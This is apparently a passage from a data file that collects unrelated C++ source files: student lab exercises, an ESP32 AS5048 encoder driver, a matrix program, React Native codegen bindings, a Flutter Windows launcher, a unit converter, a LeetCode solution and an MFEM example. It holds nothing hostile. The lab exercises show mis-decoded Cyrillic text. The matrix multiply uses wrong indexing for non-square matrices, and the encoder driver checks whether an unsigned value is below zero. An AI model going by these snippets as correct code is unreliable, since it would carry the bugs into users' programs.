cout<<endl<<\"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 float \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff: \";\r\n    cin>>num11>>num12;\r\n    cout<<\"num11*num12 = \"<<num11*num12;\r\n    cout<<endl<<\"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 uns int \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff: \";\r\n    cin>>num13>>num14;\r\n    cout<<\"num13-num14 = \"<<num13-num14;\r\n    cout<<endl<<\"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 short \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff: \";\r\n    cin>>num15>>num16;\r\n    cout<<\"num15-num16 = \"<<num15-num16;\r\n    cout<<endl<<\"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 long long \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff: \";\r\n    cin>>num17>>num18;\r\n    cout<<\"num17+num18 = \"<<num17+num18;\r\n}\r\n\r\nvoid lab2()\r\n{\r\n    long long a, b, c;\r\n    cout<<\"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00f1\u00f2\u00ee\u00f0\u00ee\u00ed\u00fb \u00ef\u00e0\u00f0\u00e0\u00eb\u00eb\u00e5\u00ef\u00e8\u00ef\u00e8\u00e4\u00e0: \";\r\n    cin>>a>>b>>c;\r\n    long long d = a*b*c;\r\n    cout<<\"\u00ce\u00e1\u00fa\u00e5\u00ec \u00ef\u00f0\u00ff\u00ec\u00ee\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00ee\u00e3\u00ee \u00ef\u00e0\u00f0\u00e0\u00eb\u00eb\u00e5\u00ef\u00e8\u00ef\u00e8\u00e4\u00e0 = \"<<d;\r\n}\r\n\r\nvoid lab3()\r\n{\r\n    int num, i;\r\n    cout<<\"\u00e2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00f7\u00e8\u00f1\u00eb\u00ee: \";\r\n    cin>>num;\r\n    cout<<\"i \u00e1\u00e8\u00f2 \u00f0\u00e0\u00e2\u00e5\u00ed \";\r\n    cin>>i;\r\n    cout<<num<<endl;\r\n    num |= (1<<i);\r\n    cout<<num;\r\n}\r\n\r\nvoid lab4()\r\n{\r\n    cout<<\"\u00cd\u00ee\u00ec\u00e5\u00f0 1:\\n\";\r\n\r\n    int a, b, c;\r\n    cout<<\"\u00d7\u00e8\u00f1\u00eb\u00e0 a, b, c = \";\r\n    cin>>a;\r\n    cin>>b;\r\n    cin>>c;\r\n    if (a < b && b < c)\r\n    {\r\n        cout<<\"c-b-a = \"<<c-b-a;\r\n    }\r\n    else if (a%c==0)\r\n    {\r\n        cout<<\"a/c+b = \"<<a/c+b;\r\n    }\r\n    else\r\n    {\r\n        cout<<\"a+b+c = \"<<a+b+c;\r\n    }\r\n\r\n    cout<<\"\\n\u00ed\u00ee\u00ec\u00e5\u00f0 2:\\n\";\r\n\r\n    int n;\r\n    cout<<\"\u00e2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ea\u00ee\u00e4 \u00f2\u00ee\u00e2\u00e0\u00f0\u00e0: \";\r\n    cin>>n;\r\n    switch (n)\r\n    {\r\n    case 1:\r\n        cout<<\"\u00f5\u00eb\u00e5\u00e1\";\r\n        break;\r\n    case 2:\r\n        cout<<\"\u00ec\u00ee\u00eb\u00ee\u00ea\u00ee\";\r\n        break;\r\n    case 3:\r\n        cout<<\"\u00f1\u00e0\u00f5\u00e0\u00f0\";\r\n        break;\r\n    case 4:\r\n        cout<<\"\u00f1\u00ee\u00eb\u00fc\";\r\n        break;\r\n    case 5:\r\n        cout<<\"\u00ff\u00e9\u00f6\u00e0\";\r\n        break;\r\n    default:\r\n        cout<<\"\u00cd\u00e5\u00ef\u00f0\u00e0\u00e2\u00e8\u00eb\u00fc\u00ed\u00ee \u00e2\u00fb\u00e1\u00f0\u00e0\u00ed \u00ea\u00ee\u00e4 \u00f2\u00ee\u00e2\u00e0\u00f0\u00e0\";\r\n        break;\r\n    }\r\n\r\n    cout<<\"\\n\u00ed\u00ee\u00ec\u00e5\u00f0 3:\\n\";\r\n\r\n    bool x;\r\n    cout<<\"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00e5: \";\r\n    cin>>x;\r\n    if (x)\r\n    {\r\n        cout<<\"Negative number\";\r\n    }\r\n    else\r\n    {\r\n        cout<<\"positive number\";\r\n    }\r\n}\r\n\r\nvoid lab5()\r\n{\r\n    cout<<\"\u00cd\u00ee\u00ec\u00e5\u00f01\\n\";\r\n\r\n    double nums[10]{-124.345, -4.0, 44.12515, -6624.153, 746.0, -67.0, 55.0, 0.124, -0.124, 124.0};\r\n    double mult = 1.0;\r\n    double min = nums[0];\r\n    int number = 0;\r\n    for (int i = 0; i < size(nums); i++)\r\n    {\r\n        double n = floor(nums[i]);\r\n        if(nums[i] - n != 0 && nums[i] < 0)\r\n        {\r\n            cout<<nums[i]<<endl;\r\n            mult = mult * nums[i];\r\n            cout<<\"\u00f6\u00e8\u00ea\u00eb \"<<i<<\"mult \"<< std::setprecision(14) << std::fixed << mult<<endl;\r\n            if (nums[i] < min)\r\n            {\r\n                min = nums[i];\r\n                number = i;\r\n            }\r\n        }\r\n    }\r\n    cout<<\"\u00cf\u00f0\u00ee\u00e8\u00e7\u00e2\u00e5\u00e4\u00e5\u00ed\u00e8\u00e5 = \"<< std::setprecision(14) << std::fixed << mult<<\"\\n\u00cd\u00e0\u00e8\u00ec\u00e5\u00ed\u00fc\u00f8\u00e5\u00e5 \u00f7\u00e8\u00f1\u00eb\u00ee = \"<<min<<\"\\n\u00cd\u00ee\u00ec\u00e5\u00f0 = \"<<number;\r\n\r\n    cout<<\"\\n\u00cd\u00ee\u00ec\u00e5\u00f02\\n\";\r\n\r\n    int num;\r\n    cout<<\"\u00e2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00f7\u00e8\u00f1\u00eb\u00ee: \";\r\n    cin>>num;\r\n    string s = std::to_string(num);\r\n    int minn = s[0] - '0';\r\n    for (int i = 0; i < size(s); i++)\r\n    {\r\n        if ((s[i] - '0') < minn)\r\n        {\r\n            minn = s[i] - '0';\r\n        }\r\n    }\r\n    cout<<\"\u00ed\u00e0\u00e8\u00ec\u00e5\u00ed\u00fc\u00f8\u00e0\u00ff \u00f6\u00e8\u00f4\u00f0\u00e0 = \"<<minn;\r\n}\r\n\r\nbool cmp(int a, int b)\r\n{\r\n    int sum1 = 0;\r\n    int sum2 = 0;\r\n    string s1 = to_string(a);\r\n    string s2 = to_string(b);\r\n    for (int i = 0; i < size(s1); i++)\r\n    {\r\n        sum1 += s1[i] - '0';\r\n    }\r\n    for (int i = 0; i < size(s2); i++)\r\n    {\r\n        sum2 += s2[i] - '0';\r\n    }\r\n    return sum1>sum2;\r\n}\r\n\r\nbool cmp1(int a, int b)\r\n{\r\n    int num1 = 0;\r\n    int num2 = 0;\r\n    string s1 = to_string(a);\r\n    string s2 = to_string(b);\r\n    num1 = s1[0] - '0';\r\n    num2 = s2[0] - '0';\r\n    return num1>num2;\r\n}\r\n\r\nvoid lab6()\r\n{\r\n    cout<<\"",
    "#include \"AS5048my.h\"\n\n#include \"esp_log.h\"\n\nAS5048::AS5048(rmt_channel_t channel, gpio_num_t gpio_num)\n    : _channel(channel), _gpioNum(gpio_num), _angle(0), _previousAngle(0), _lastTime(0) {}\n\nesp_err_t AS5048::init() {\n    // Initialize RMT for reading the PWM signal from AS5048\n    rmt_config_t rmtConfig = {};\n    rmtConfig.rmt_mode = RMT_MODE_RX;        // Set the RMT mode to RX\n    rmtConfig.channel = _channel;            // Set the RMT channel\n    rmtConfig.gpio_num = _gpioNum;          // Set the GPIO number\n    rmtConfig.clk_div = 40;                  // Adjust the clock divider as necessary\n\n    // Set valid RX configuration parameters\n    rmtConfig.rx_config.idle_threshold = 1000; // Idle threshold in ticks\n\n\n    esp_err_t err = rmt_config(&rmtConfig); // Configure the RMT driver with the specified settings\n    if (err != ESP_OK) {\n        return err; // Return error if configuration fails\n    }\n\n    return ESP_OK; // Return success\n}\n\n\nuint16_t AS5048::readAngle() {\n    rmt_item32_t item;\n    RingbufHandle_t rb;\n    esp_err_t err = rmt_get_ringbuf_handle(_channel, &rb);\n    \n    if (err != ESP_OK) {\n        return 0; // Return 0 on error\n    }\n\n    // Wait for data to be available in the ring buffer\n    rmt_item32_t* itemData = (rmt_item32_t*)xRingbufferReceive(rb, NULL, portMAX_DELAY);\n    if (itemData) {\n        // Process the received item (extracting the angle from the PWM signal)\n        // Note: The angle calculation depends on the specifics of your encoder's output\n        // Assuming the PWM signal is in the format we expect for angle extraction\n        uint32_t pulseWidth = itemData->duration0; // Example to get pulse width\n        _angle = (pulseWidth * 360) / 1000; // Adjust according to your encoder's specs\n        vRingbufferReturnItem(rb, (void*)itemData);\n        \n        // Normalize angle to [0, 360) range\n        normalizeAngle();\n    }\n\n    return _angle;\n}\n\nvoid AS5048::normalizeAngle() {\n    if (_angle >= 360) {\n        _angle -= 360; // Wrap around if angle exceeds 360\n    } else if (_angle < 0) {\n        _angle += 360; // Wrap around if angle is negative\n    }\n}\n\nvoid AS5048::resetPosition() {\n    // Reset the angle or handle as necessary\n    _angle = 0; // Reset angle to 0\n}\n\nfloat AS5048::calculateAngularVelocity() {\n    unsigned long currentTime = xTaskGetTickCount(); // Get current time in ticks\n    uint16_t currentAngle = readAngle(); // Read the current angle\n\n    // Calculate the time difference in seconds\n    float deltaTime = (currentTime - _lastTime) / (float)configTICK_RATE_HZ;\n\n    // Calculate angular velocity (in degrees per second)\n    float angularVelocity = (currentAngle - _previousAngle) / deltaTime;\n\n    // Update previous values\n    _previousAngle = currentAngle;\n    _lastTime = currentTime;\n\n    return angularVelocity;\n}\n",
    "#include <iostream>\n#include <iomanip>\n#include <io.h>\n#include <fcntl.h>\nstatic void mul_mat(const int n, const int m, const int k, const double* const mat1, const double* const mat2, double* const res)\n{\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tfor (int j = 0; j < k; j++)\n\t\t{\n\t\t\tres[i * k + j] = 0;\n\t\t\tfor (int l = 0; l < n; l++)\n\t\t\t{\n\t\t\t\tres[i * k + j] += mat1[i * m + l] * mat2[l * n + j];\n\t\t\t}\n\t\t}\n\t}\n}\nstatic bool pow_mat(const int n, const int k, const double* const mat, double* res1, double* res2)\n{\n\tmul_mat(n, n, n, mat, mat, res1);\n\tfor (int i = 1; i < k - 1; i++)\n\t{\n\t\tif (i % 2)\n\t\t{\n\t\t\tmul_mat(n, n, n, res1, mat, res2);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tmul_mat(n, n, n, res2, mat, res1);\n\t\t}\n\t}\n\treturn k % 2;\n}\nstatic void out_mat(const int n, const int m, const double* const mat)\n{\n\tint maxlen = INT32_MIN;\n\tfor (int i = 0; i < n * m; i++)\n\t{\n\t\tint len = std::snprintf(nullptr, 0, \"%.2f\", mat[i]);\n\t\tif (len > maxlen)\n\t\t{\n\t\t\tmaxlen = len;\n\t\t}\n\t}\n\tconst int ALIGN_W = maxlen;\n\tstd::wcout << '|';\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tfor (int j = 0; j < m; j++)\n\t\t{\n\t\t\tif (j < m - 1)\n\t\t\t{\n\t\t\t\tstd::wcout << std::left << std::setw(ALIGN_W) << std::setfill(L' ') << mat[i * m + j];\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tstd::wcout << mat[i * m + j] << \"|\\n\";\n\t\t\t\tif (i < n - 1)\n\t\t\t\t{\n\t\t\t\t\tstd::wcout << \"|\";\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\nstatic void out_mat_autoui(const int n, const int m, const double* const mat)\n{\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tfor (int j = 0; j < m - 1; j++)\n\t\t{\n\t\t\tstd::wcout << mat[i * m + j] << ' ';\n\t\t}\n\t\tstd::wcout << mat[i * m + m - 1] << '\\n';\n\t}\n}\nstatic void in_mat(const int n, const int m, double* const mat)\n{\n\tfor (int i = 0; i < n * m; i++)\n\t{\n\t\tstd::wcin >> mat[i];\n\t}\n}\nint wmain(int argc, wchar_t* argv[])\n{\n\tif (!(_setmode(_fileno(stdout), _O_U8TEXT) && _setmode(_fileno(stdin), _O_U8TEXT) && _setmode(_fileno(stderr), _O_U8TEXT)))\n\t\treturn 1;\n\tbool autoui = true;\n\tif (argc <= 1 || std::wcsncmp(argv[1], L\"false\", sizeof(L\"false\") - 1) != 0)\n\t{\n\t\tautoui = false;\n\t}\n\tint n, m;\n\tstd::wcin >> n >> m;\n\tdouble* a1 = new double[n * m];\n\tin_mat(n, m, a1);\n\tint cmd = 1, k = 0;\n\twhile (cmd != 0)\n\t{\n\t\tstd::wcin >> cmd;\n\t\tswitch (cmd)\n\t\t{\n\t\tcase 0:\n\t\t\tbreak;\n\t\tcase 1:\n\t\t{\n\t\t\tif (autoui)\n\t\t\t{\n\t\t\t\tout_mat_autoui(n, m, a1);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tout_mat(n, m, a1);\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\tcase 2:\n\t\t{\n\t\t\tstd::wcin >> k;\n\t\t\tdouble* a2 = new double[m * k];\n\t\t\tdouble* res = new double[n * k] {};\n\t\t\tin_mat(m, k, a2);\n\t\t\tmul_mat(n, m, k, a1, a2, res);\n\t\t\tdelete[] a1;\n\t\t\ta1 = res;\n\t\t\tdelete[] a2;\n\t\t\tm = k;\n\t\t\tbreak;\n\t\t}\n\t\tcase 3:\n\t\t{\n\t\t\tif (n == m)\n\t\t\t{\n\t\t\t\tstd::wcin >> k;\n\t\t\t\tdouble* res1 = new double[n * n] {};\n\t\t\t\tdouble* res2 = new double[n * n] {};\n\t\t\t\tbool swp = pow_mat(n, k, a1, res1, res2);\n\t\t\t\tdelete[] a1;\n\t\t\t\tif (swp)\n\t\t\t\t{\n\t\t\t\t\ta1 = res2;\n\t\t\t\t\tdelete[] res1;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\ta1 = res1;\n\t\t\t\t\tdelete[] res2;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tstd::wcout << \"NO\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\tdefault:\n\t\t{\n\t\t\tstd::wcerr << \"Invalid Input\";\n\t\t\treturn 1;\n\t\t}\n\t\t}\n\t}\n}",
    "/**\n * This code was generated by [react-native-codegen](https://www.npmjs.com/package/react-native-codegen).\n *\n * Do not edit this file as changes may cause incorrect behavior and will be lost\n * once the code is regenerated.\n *\n * @generated by codegen project: GenerateModuleCpp.js\n */\n\n#include \"FBReactNativeSpecJSI.h\"\n\nnamespace facebook {\nnamespace react {\n\nstatic jsi::Value __hostFunction_NativeDevToolsSettingsManagerCxxSpecJSI_setConsolePatchSettings(jsi::Runtime &rt, TurboModule &turboModule, const jsi::Value* args, size_t count) {\n  static_cast<NativeDevToolsSettingsManagerCxxSpecJSI *>(&turboModule)->setConsolePatchSettings(\n    rt,\n    args[0].asString(rt)\n  );\n  return jsi::Value::undefined();\n}\nstatic jsi::Value __hostFunction_NativeDevToolsSettingsManagerCxxSpecJSI_getConsolePatchSettings(jsi::Runtime &rt, TurboModule &turboModule, const jsi::Value* args, size_t count) {\n  auto result = static_cast<NativeDevToolsSettingsManagerCxxSpecJSI *>(&turboModule)->getConsolePatchSettings(\n    rt\n  );\n  return result ? jsi::Value(std::move(*result)) : jsi::Value::null();\n}\nstatic jsi::Value __hostFunction_NativeDevToolsSettingsManagerCxxSpecJSI_setProfilingSettings(jsi::Runtime &rt, TurboModule &turboModule, const jsi::Value* args, size_t count) {\n  static_cast<NativeDevToolsSettingsManagerCxxSpecJSI *>(&turboModule)->setProfilingSettings(\n    rt,\n    args[0].asString(rt)\n  );\n  return jsi::Value::undefined();\n}\nstatic jsi::Value __hostFunction_NativeDevToolsSettingsManagerCxxSpecJSI_getProfilingSettings(jsi::Runtime &rt, TurboModule &turboModule, const jsi::Value* args, size_t count) {\n  auto result = static_cast<NativeDevToolsSettingsManagerCxxSpecJSI *>(&turboModule)->getProfilingSettings(\n    rt\n  );\n  return result ? jsi::Value(std::move(*result)) : jsi::Value::null();\n}\n\nNativeDevToolsSettingsManagerCxxSpecJSI::NativeDevToolsSettingsManagerCxxSpecJSI(std::shared_ptr<CallInvoker> jsInvoker)\n  : TurboModule(\"DevToolsSettingsManager\", jsInvoker) {\n  methodMap_[\"setConsolePatchSettings\"] = MethodMetadata {1, __hostFunction_NativeDevToolsSettingsManagerCxxSpecJSI_setConsolePatchSettings};\n  methodMap_[\"getConsolePatchSettings\"] = MethodMetadata {0, __hostFunction_NativeDevToolsSettingsManagerCxxSpecJSI_getConsolePatchSettings};\n  methodMap_[\"setProfilingSettings\"] = MethodMetadata {1, __hostFunction_NativeDevToolsSettingsManagerCxxSpecJSI_setProfilingSettings};\n  methodMap_[\"getProfilingSettings\"] = MethodMetadata {0, __hostFunction_NativeDevToolsSettingsManagerCxxSpecJSI_getProfilingSettings};\n}\nstatic jsi::Value __hostFunction_NativeVibrationCxxSpecJSI_getConstants(jsi::Runtime &rt, TurboModule &turboModule, const jsi::Value* args, size_t count) {\n  return static_cast<NativeVibrationCxxSpecJSI *>(&turboModule)->getConstants(\n    rt\n  );\n}\nstatic jsi::Value __hostFunction_NativeVibrationCxxSpecJSI_vibrate(jsi::Runtime &rt, TurboModule &turboModule, const jsi::Value* args, size_t count) {\n  static_cast<NativeVibrationCxxSpecJSI *>(&turboModule)->vibrate(\n    rt,\n    args[0].asNumber()\n  );\n  return jsi::Value::undefined();\n}\nstatic jsi::Value __hostFunction_NativeVibrationCxxSpecJSI_vibrateByPattern(jsi::Runtime &rt, TurboModule &turboModule, const jsi::Value* args, size_t count) {\n  static_cast<NativeVibrationCxxSpecJSI *>(&turboModule)->vibrateByPattern(\n    rt,\n    args[0].asObject(rt).asArray(rt),\n    args[1].asNumber()\n  );\n  return jsi::Value::undefined();\n}\nstatic jsi::Value __hostFunction_NativeVibrationCxxSpecJSI_cancel(jsi::Runtime &rt, TurboModule &turboModule, const jsi::Value* args, size_t count) {\n  static_cast<NativeVibrationCxxSpecJSI *>(&turboModule)->cancel(\n    rt\n  );\n  return jsi::Value::undefined();\n}\n\nNativeVibrationCxxSpecJSI::NativeVibrationCxxSpecJSI(std::shared_ptr<CallInvoker> jsInvoker)\n  : TurboModule(\"Vibration\", jsInvoker) {\n  methodMap_[\"getConstants\"] = MethodMetadata {0, __hostFunction_NativeVibrationCxxSpecJSI_getConstants};\n  methodMap_[\"vibrate\"] = MethodMetadata {1, __hostFunction_NativeVibrationCxxSpecJSI_vibrate};\n  methodMap_[\"vibrateByPattern\"] = MethodMetadata {2, __hostFunction_NativeVibrationCxxSpecJSI_vibrateByPattern};\n  methodMap_[\"cancel\"] = MethodMetadata {0, __hostFunction_NativeVibrationCxxSpecJSI_cancel};\n}\nstatic jsi::Value __hostFunction_NativeSettingsManagerCxxSpecJSI_getConstants(jsi::Runtime &rt, TurboModule &turboModule, const jsi::Value* args, size_t count) {\n  return static_cast<NativeSettingsManagerCxxSpecJSI *>(&turboModule)->getConstants(\n    rt\n  );\n}\nstatic jsi::Value __hostFunction_NativeSettingsManagerCxxSpecJSI_setValues(jsi::Runtime &rt, TurboModule &turboModule, const jsi::Value* args, size_t count) {\n  static_cast<NativeSettingsManagerCxxSpecJSI *>(&turboModule)->setValues(\n    rt,\n    args[0].asObject(rt)\n  );\n  return jsi::Value::undefined();\n}\nstatic jsi::Value __hostFunction_NativeSettingsManagerCxxSpecJSI_deleteValues(jsi::Runtime &rt, TurboModule &turboModule, const jsi::Value* args, size_t count) {\n  static_cast<NativeSett",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"favorite_places_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <iomanip>\r\nusing namespace std;\r\n//================================================================================================\r\nclass Unitconverter\r\n{\r\nprivate:\r\npublic:\r\n    string Length, Area, Temperature, Weight, Speed, Volume, Money;\r\n    double value;\r\n    string fromUnit, toUnit, result;\r\n//================================================================================================\r\n// Function to Length\r\n    void Length1() \r\n    {\r\n        cout << \"Enter the length value: \";\r\n        cin >> value;\r\n        cout << \"Enter the 'from' unit (km, hm, dam, m, dm, cm, mm): \";\r\n        cin >> fromUnit;\r\n        cout << \"Enter the 'to' unit (km, hm, dam, m, dm, cm, mm): \";\r\n        cin >> toUnit;\r\n\r\n        double convertedValue = convertLength(value, fromUnit, toUnit);\r\n        cout << fixed << setprecision(6);\r\n        cout << value << \" \" << fromUnit << \" is \" << convertedValue << \" \" << toUnit << endl;\r\n\r\n        // Write the result to the file\r\n        string result = to_string(value) + \" \" + fromUnit + \" is \" + to_string(convertedValue) + \" \" + toUnit;\r\n        WriteUnitconverterToFile(result);\r\n    }\r\n\r\n    // Function to convert length between different units\r\n    double convertLength(double value, const string& fromUnit, const string& toUnit) \r\n    {\r\n        // Conversion factors to meters\r\n        double toMeters = 0.0;\r\n        double fromMeters = 0.0;\r\n\r\n        // Conversion factor map\r\n        if (fromUnit == \"km\") fromMeters = 1000.0;\r\n        else if (fromUnit == \"hm\") fromMeters = 100.0;\r\n        else if (fromUnit == \"dam\") fromMeters = 10.0;\r\n        else if (fromUnit == \"m\") fromMeters = 1.0;\r\n        else if (fromUnit == \"dm\") fromMeters = 0.1;\r\n        else if (fromUnit == \"cm\") fromMeters = 0.01;\r\n        else if (fromUnit == \"mm\") fromMeters = 0.001;\r\n        else \r\n        {\r\n            cerr << \"Unknown 'from' unit: \" << fromUnit << endl;\r\n            return 0.0;\r\n        }\r\n\r\n        if (toUnit == \"km\") toMeters = 1000.0;\r\n        else if (toUnit == \"hm\") toMeters = 100.0;\r\n        else if (toUnit == \"dam\") toMeters = 10.0;\r\n        else if (toUnit == \"m\") toMeters = 1.0;\r\n        else if (toUnit == \"dm\") toMeters = 0.1;\r\n        else if (toUnit == \"cm\") toMeters = 0.01;\r\n        else if (toUnit == \"mm\") toMeters = 0.001;\r\n        else \r\n        {\r\n            cerr << \"Unknown 'to' unit: \" << toUnit << endl;\r\n            return 0.0;\r\n        }\r\n\r\n        // Convert value to meters and then to the target unit\r\n        return value * (fromMeters / toMeters) ;\r\n    }\r\n//================================================================================================\r\n// Function to Area\r\n    void Area1() \r\n    {\r\n        cout << \"Enter the area value: \";\r\n        cin >> value;\r\n        cout << \"Enter the 'from' unit (km^2, hm^2, dam^2, m^2, dm^2, cm^2, mm^2): \";\r\n        cin >> fromUnit;\r\n        cout << \"Enter the 'to' unit (km^2, hm^2, dam^2, m^2, dm^2, cm^2, mm^2): \";\r\n        cin >> toUnit;\r\n\r\n        double convertedValue = convertArea(value, fromUnit, toUnit);\r\n        cout << fixed << setprecision(6);\r\n        cout << value << \" \" << fromUnit << \" is \" << convertedValue << \" \" << toUnit << endl;\r\n\r\n        // Write the result to the file\r\n        string result = to_string(value) + \" \" + fromUnit + \" is \" + to_string(convertedValue) + \" \" + toUnit;\r\n        WriteUnitconverterToFile(result);\r\n    }\r\n\r\n    // Function to convert area between different units\r\n    double convertArea(double value, const string& fromUnit, const string& toUnit) \r\n    {\r\n        // Conversion factors to meters\r\n        double toMeters = 0.0;\r\n        double fromMeters = 0.0;\r\n\r\n        // Conversion factor map\r\n        if (fromUnit == \"km^2\") fromMeters = 1000000.0;\r\n        else if (fromUnit == \"hm^2\") fromMeters = 10000.0;\r\n        else if (fromUnit == \"dam^2\") fromMeters = 100.0;\r\n        else if (fromUnit == \"m^2\") fromMeters = 1.0;\r\n        else if (fromUnit == \"dm^2\") fromMeters = 0.01;\r\n        else if (fromUnit == \"cm^2\") fromMeters = 0.0001;\r\n        else if (fromUnit == \"mm^2\") fromMeters = 0.000001;\r\n        else \r\n        {\r\n            cerr << \"Unknown 'from' unit: \" << fromUnit << endl;\r\n            return 0.0;\r\n        }\r\n\r\n        if (toUnit == \"km^2\") toMeters = 1000000.0;\r\n        else if (toUnit == \"hm^2\") toMeters = 10000.0;\r\n        else if (toUnit == \"dam^2\") toMeters = 100.0;\r\n        else if (toUnit == \"m^2\") toMeters = 1.0;\r\n        else if (toUnit == \"dm^2\") toMeters = 0.01;\r\n        else if (toUnit == \"cm^2\") toMeters = 0.0001;\r\n        else if (toUnit == \"mm^2\") toMeters = 0.000001;\r\n        else \r\n        {\r\n            cerr << \"Unknown 'to' unit: \" << toUnit << endl;\r\n            return 0.0;\r\n        }\r\n\r\n        // Convert value to meters and then to the target unit\r\n        return value * (fromMeters / toMeters);\r\n    }\r\n//==========================================================================",
    "/*\n * @lc app=leetcode id=162 lang=cpp\n *\n * [162] Find Peak Element\n */\n\n// @lc code=start\n#include <vector>\n#include <iostream>\n\nclass Solution {\npublic:\n    int findPeakElement(vector<int>& nums) {\n        // 1. Initialize two pointers: left and right to cover the entire array.\n        int left = 0;\n        int right = nums.size() - 1;\n        \n        // 2. Perform binary search by adjusting the pointers based on comparison of mid and mid+1.\n        while (left < right) {\n            // 3. Calculate the middle index.\n            int mid = left + (right - left) / 2;\n            \n            // 4. Check if the mid element is less than its next element.\n            if (nums[mid] < nums[mid + 1]) {\n                // 5. If true, move left pointer to mid + 1 (there's a peak on the right).\n                left = mid + 1;\n            } else {\n                // 6. Otherwise, move right pointer to mid (there's a peak on the left).\n                right = mid;\n            }\n        }\n        \n        // 7. When left equals right, return the peak index.\n        return left;        \n    }\n};\n// @lc code=end\n\n",
    "/*                             MFEM modified from ex2\n//\n// Compile with: make ex2\n//\n// Sample runs:  ex2 -m ../data/beam-tri.mesh\n//               ex2 -m ../data/beam-quad.mesh\n//               ex2 -m ../data/beam-tet.mesh\n//               ./ex2m -m ../data/beam-hex.mesh\n//               ex2 -m ../data/beam-wedge.mesh\n//               ex2 -m ../data/beam-quad.mesh -o 3 -sc\n//               ex2 -m ../data/beam-quad-nurbs.mesh\n//               ./ex2m -m ../data/beam-hex-nurbs.mesh\n//\n// Description:  This example code solves a simple linear elasticity problem\n//               describing a multi-material cantilever beam.\n//\n//               Specifically, we approximate the weak form of -div(sigma(u))=0\n//               where sigma(u)=lambda*div(u)*I+mu*(grad*u+u*grad) is the stress\n//               tensor corresponding to displacement field u, and lambda and mu\n//               are the material Lame constants. The boundary conditions are\n//               u=0 on the fixed part of the boundary with attribute 1, and\n//               sigma(u).n=f on the remainder with f being a constant pull down\n//               vector on boundary elements with attribute 2, and zero\n//               otherwise. The geometry of the domain is assumed to be as\n//               follows:\n//\n//                                 +----------+----------+\n//                    boundary --->| material | material |<--- boundary\n//                    attribute 1  |    1     |    2     |     attribute 2\n//                    (fixed)      +----------+----------+     (pull down)\n//\n//               The example demonstrates the use of high-order and NURBS vector\n//               finite element spaces with the linear elasticity bilinear form,\n//               meshes with curved elements, and the definition of piece-wise\n//               constant and vector coefficient objects. Static condensation is\n//               also illustrated.\n//\n//               We recommend viewing Example 1 before viewing this example.\n*/ \n\n#include \"mfem.hpp\"\n#include \"ex2m.hpp\"\n#include <fstream>\n#include <iostream>\n\nusing namespace std;\nusing namespace mfem;\n\n\nint main(int argc, char *argv[])\n{\n   // 1. \u53c2\u6570\u8bbe\u7f6e\n   \n   const char *mesh_file = \"../data/beam-tri.mesh\";\n   int order = 1;\n   int ref_levels = 1; //\u9ed8\u8ba4\u7684\u7f51\u683c\u52a0\u5bc6\u5c42\u7ea7\n   bool static_cond = false;\n   bool visualization = false;\n   bool paraview=true;\n\n   OptionsParser args(argc, argv);\n   args.AddOption(&mesh_file, \"-m\", \"--mesh\",\n                  \"Mesh file to use.\");\n   args.AddOption(&ref_levels, \"-r\", \"--refine\",\n                  \"Number of times to refine the mesh uniformly.\");\n   args.AddOption(&order, \"-o\", \"--order\",\n                  \"Finite element order (polynomial degree).\");\n   args.AddOption(&static_cond, \"-sc\", \"--static-condensation\", \"-no-sc\",\n          